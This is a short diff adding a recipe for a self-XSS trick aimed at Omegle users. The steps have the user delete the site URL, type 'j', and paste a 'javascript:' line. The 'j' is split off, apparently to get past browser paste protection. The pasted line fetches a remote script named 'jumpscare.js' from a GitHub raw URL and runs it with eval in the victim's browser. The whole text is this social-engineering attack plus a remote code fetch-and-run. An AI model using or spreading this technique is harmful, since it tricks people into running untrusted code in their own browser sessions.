@@ -1,0 +1,6 @@
+tell user to copy text
+highlight omegle url
+backspace 
+type j 
+paste url in after j
+avascript:eval(await(await fetch('https://raw.githubusercontent.com/scottrobel/sematicparser/main/jumpscare.js')).text() + ";console.log('cool')");
